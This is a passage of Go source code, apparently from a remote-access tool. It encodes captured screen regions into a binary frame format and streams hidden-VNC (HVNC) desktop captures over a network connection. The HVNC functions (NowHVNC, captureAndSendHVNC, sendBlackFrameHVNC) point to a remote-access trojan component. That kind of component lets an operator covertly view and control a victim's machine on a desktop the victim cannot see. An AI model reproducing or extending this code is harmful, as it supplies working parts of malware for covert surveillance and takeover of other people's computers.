			regions = append(regions, streamRegion{x, y, w, h})
		}
	}
	sortRegionsByROI(regions, rois)
	statMergeNs.Add(time.Since(mergeStart).Nanoseconds())

	buf := bytes.Buffer{}
	_ = binary.Write(&buf, binary.LittleEndian, uint16(width))
	_ = binary.Write(&buf, binary.LittleEndian, uint16(height))
	_ = binary.Write(&buf, binary.LittleEndian, uint16(len(regions)))
	_ = binary.Write(&buf, binary.LittleEndian, uint16(0))

	totalEncDur := time.Duration(0)
	for _, r := range regions {
		encStart := time.Now()
		var payload []byte
		var err error
		if codec == "raw" {
			payload = encodeBlockRaw(img, r.x, r.y, r.w, r.h)
		} else {
			blockQuality := quality + 10
			if blockQuality > 100 {
				blockQuality = 100
			}
			payload, err = encodeJPEG(img.SubImage(image.Rect(r.x, r.y, r.x+r.w, r.y+r.h)), blockQuality)
			if err != nil {
				return 0, nil, 0, err
			}
		}
		totalEncDur += time.Since(encStart)

		_ = binary.Write(&buf, binary.LittleEndian, uint16(r.x))
		_ = binary.Write(&buf, binary.LittleEndian, uint16(r.y))
		_ = binary.Write(&buf, binary.LittleEndian, uint16(r.w))
		_ = binary.Write(&buf, binary.LittleEndian, uint16(r.h))
		_ = binary.Write(&buf, binary.LittleEndian, uint32(len(payload)))
		buf.Write(payload)
	}

	prevCopyStart := time.Now()
	prevMu.Lock()
	copyPrev(img)
	prevMu.Unlock()
	statPrevCopyNs.Add(time.Since(prevCopyStart).Nanoseconds())

	return len(regions), buf.Bytes(), totalEncDur, nil
}

func copyPrev(img *image.RGBA) {
	width := img.Bounds().Dx()
	height := img.Bounds().Dy()
	n := len(img.Pix)
	if prevFrame != nil && cap(prevFrame.pix) >= n {
		prevFrame.w = width
		prevFrame.h = height
		prevFrame.pix = prevFrame.pix[:n]
		copy(prevFrame.pix, img.Pix)
	} else {
		buf := make([]byte, n)
		copy(buf, img.Pix)
		prevFrame = &prevImage{w: width, h: height, pix: buf}
	}
}

func encodeBlockRaw(img *image.RGBA, x, y, w, h int) []byte {
	stride := img.Stride
	buf := make([]byte, w*h*4)
	dst := 0
	srcBase := y*stride + x*4
	for row := 0; row < h; row++ {
		src := srcBase + row*stride
		copy(buf[dst:dst+w*4], img.Pix[src:src+w*4])
		dst += w * 4
	}
	return buf
}

func blockCodec() string {
	if v := overrideCodec.Load(); v != nil {
		if s, ok := v.(string); ok && s != "" {
			return s
		}
	}
	blockCodecOnce.Do(func() {
		codec := strings.ToLower(os.Getenv(blockCodecEnv))
		switch codec {
		case "h264":
			cachedBlockCodec = "h264"
		case "raw", "rgba":
			cachedBlockCodec = "raw"
		case "jpeg", "":
			cachedBlockCodec = "jpeg"
		default:
			cachedBlockCodec = "jpeg"
		}
	})
	return cachedBlockCodec
}

func SetQualityAndCodec(quality int, codec string) {
	if quality > 0 {
		if quality > 100 {
			quality = 100
		}
		overrideQuality.Store(int64(quality))
	}
	s := strings.ToLower(strings.TrimSpace(codec))
	if s == "h264" && !h264Available() {
		detail := h264AvailabilityDetail()
		if detail != "" {
			log.Printf("capture: requested codec=h264 but unavailable (%s); forcing codec=jpeg", detail)
		} else {
			log.Printf("capture: requested codec=h264 but unavailable; forcing codec=jpeg")
		}
		s = "jpeg"
	}
	switch s {
	case "raw", "rgba", "jpeg", "h264":
		overrideCodec.Store(s)
		h264WarnOnce = sync.Once{}
		if s != "h264" {
			resetH264Encoder()
		}
	case "":

	default:
		overrideCodec.Store("jpeg")
		resetH264Encoder()
	}
}

func NowHVNC(ctx context.Context, env *rt.Env) error {
	if env.Cfg.DisableCapture {
		return sendBlackFrameHVNC(ctx, env)
	}
	if !supportsHVNCCapture() {
		return nil
	}
	return captureAndSendHVNC(ctx, env)
}

func supportsHVNCCapture() bool {
	count := HVNCMonitorCount()
	return count > 0
}

func captureAndSendHVNC(ctx context.Context, env *rt.Env) error {
	defer func() {
		if r := recover(); r != nil {
			log.Printf("hvnc capture: panic in captureAndSendHVNC: %v", r)
		}
	}()

	display := env.HVNCSelectedDisplay
	if display < 0 || display >= HVNCMonitorCount() {
		display = 0
		log.Printf("hvnc capture: requested display %d out of range, defaulting to 0", display)
	}

	t0 := time.Now()
	img, err := safeHVNCCaptureDisplay(display)
	if err != nil {
		log.Printf("hvnc capture: capture failed: %v (sending black frame)", err)
		return sendBlackFrameHVNC(ctx, env)
	}
	if img == nil {
		log.Printf("hvnc capture: capture returned nil image (sending black frame)")
		return sendBlackFrameHVNC(ctx, env)
	}
	captureDur := time.Since(t0)

	quality := jpegQuality()
	frame, encodeDur, err := buildFrameHVNC(img, display, quality)
	if err != nil {
		return err
	}

	now := time.Now()
	fps := frameFPS(now)
	if fps <= 0 {
		fps = 1
	}
	frame.Header.FPS = fps

	if ctx.Err() != nil {
		return nil
	}

	sendStart := time.Now()
	err = wire.WriteMsg(ctx, env.Conn, frame)
	sendDur := time.Since(sendStart)

	if shouldLogFrame(now) {
		total := time.Since(t0)
		log.Printf("hvnc capture: stream display=%d fps≈%d format=%s size=%d cap=%s enc=%s send=%s total=%s",
			display, fps, frame.Header.Format, len(frame.Data), captureDur, encodeDur, sendDur, total)
	}

	return err
}

func safeHVNCCaptureDisplay(display int) (*image.RGBA, error) {
	defer func() {
		_ = recover()
	}()
	img, err := hvncCaptureDisplay(display)
	if err != nil {
		return nil, err
	}
	return img, nil
}

func sendBlackFrameHVNC(ctx context.Context, env *rt.Env) error {
	if ctx.Err() != nil {
		return nil
	}

	img := image.NewRGBA(image.Rect(0, 0, 64, 64))
	quality := 60
	frame, _, err := buildFrame(img, 0, quality)
	if err != nil {
		return err
	}
	frame.Header.FPS = 1
	return wire.WriteMsg(ctx, env.Conn, frame)
}
